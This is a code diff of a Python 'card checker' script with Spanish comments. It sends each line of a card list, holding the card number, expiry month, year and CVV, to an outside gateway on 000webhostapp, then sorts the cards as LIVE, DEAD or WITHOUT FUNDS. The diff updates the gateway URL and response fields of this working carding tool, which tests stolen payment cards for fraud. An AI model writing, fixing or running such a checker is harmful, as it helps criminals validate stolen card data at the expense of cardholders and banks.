@@ -22,28 +22,28 @@ for line in list:
 
     session = requests.session()  # <--- Crea la sesion
 
-    url = 'https://apisconsumer.000webhostapp.com/Api-Hamilton/api.php?lista='+aea
+    url = 'https://apisconsumer.000webhostapp.com/HamiltonRT/principal.php?cc='+aea
 
     response = session.post(url)
     rpta = response.json()
 
     card = rpta['CC']
-    Month = rpta['MES']
-    year = rpta['Ano']
-    Secure = rpta['CVV']
+    Month = rpta['Month']
+    year = rpta['Year']
+    Secure = rpta['Cvv']
 
     song = (card+'|'+Month+'|'+year+'|'+Secure)
 
-    Alert = rpta['Estado']
-    Alert2 = rpta['suff']
+    Alert = rpta['Stuff']
+    Alert2 = rpta['Activity']
 
     if 'Your card has insufficient funds.' in Alert:
-        print('[WITHOUT FUNDS] ' + song +'  '+ Alert)
+        print('[WITHOUT FUNDS] ' + song + '  ' + Alert)
     else:
         if 'Success' in Alert2:
-            print('[LIVE] ' + song +'  '+ Alert2)
+            print('[LIVE] ' + song + '  ' + Alert2)
         else:
-            print('[DEAD] ' + song +'  '+ Alert)
+            print('[DEAD] ' + song + '  ' + Alert)
 print('')
 print('#######################################################################')
 print('[GATE 1]                 F I N A L I Z A D O                   [GATE 1]')
